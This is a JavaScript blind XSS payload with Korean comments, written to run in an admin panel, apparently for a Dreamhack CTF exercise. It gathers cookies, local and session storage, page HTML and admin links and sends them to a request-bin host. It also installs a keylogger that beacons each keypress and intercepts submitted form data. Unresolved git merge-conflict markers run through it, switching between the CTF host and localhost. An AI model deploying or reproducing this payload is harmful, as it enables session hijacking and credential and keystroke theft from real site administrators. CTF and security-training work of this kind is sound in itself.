
    // Blind XSS Payload - 관리자 패널에서 실행될 것을 가정
    (function() {
        // 페이지 정보 수집
        var adminData = {
            cookies: document.cookie,
            url: window.location.href,
            title: document.title,
            // HTML 일부만 (너무 크면 전송 실패 가능)
            html: document.documentElement.innerHTML.substring(0, 5000),
            localStorage: {},
            sessionStorage: {},
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };
        
        // localStorage 수집
        try {
            for (var key in localStorage) {
                adminData.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        
        // sessionStorage 수집
        try {
            for (var key in sessionStorage) {
                adminData.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        
        // 관리자 링크 찾기
        var adminLinks = [];
        document.querySelectorAll('a').forEach(function(link) {
            if (link.href.includes('admin') || link.href.includes('manage') || 
                link.href.includes('dashboard') || link.href.includes('panel')) {
                adminLinks.push(link.href);
            }
        });
        adminData.adminLinks = adminLinks;
        
        // 데이터 전송
        var xhr = new XMLHttpRequest();
<<<<<<< HEAD
        xhr.open('POST', 'https://enxzoji.request.dreamhack.games/blind-steal', true);
=======
        xhr.open('POST', 'http://127.0.0.1:5000/blind-steal', true);
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(adminData));
        
        // 백업 전송 방법 (이미지 태그)
        var img = new Image();
<<<<<<< HEAD
        img.src = 'https://enxzoji.request.dreamhack.games/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
=======
        img.src = 'http://127.0.0.1:5000/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
        
        // 키로거 설치
        document.addEventListener('keypress', function(e) {
            var k = new Image();
<<<<<<< HEAD
            k.src = 'https://enxzoji.request.dreamhack.games/blind-key?k=' + e.key + '&t=' + Date.now();
=======
            k.src = 'http://127.0.0.1:5000/blind-key?k=' + e.key + '&t=' + Date.now();
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
        });
        
        // 폼 데이터 가로채기
        document.addEventListener('submit', function(e) {
            var formData = new FormData(e.target);
            var data = {};
            formData.forEach(function(value, key) {
                data[key] = value;
            });
            
            var f = new Image();
<<<<<<< HEAD
            f.src = 'https://enxzoji.request.dreamhack.games/blind-form?data=' + btoa(JSON.stringify(data));
=======
            f.src = 'http://127.0.0.1:5000/blind-form?data=' + btoa(JSON.stringify(data));
>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
        });
    })();
    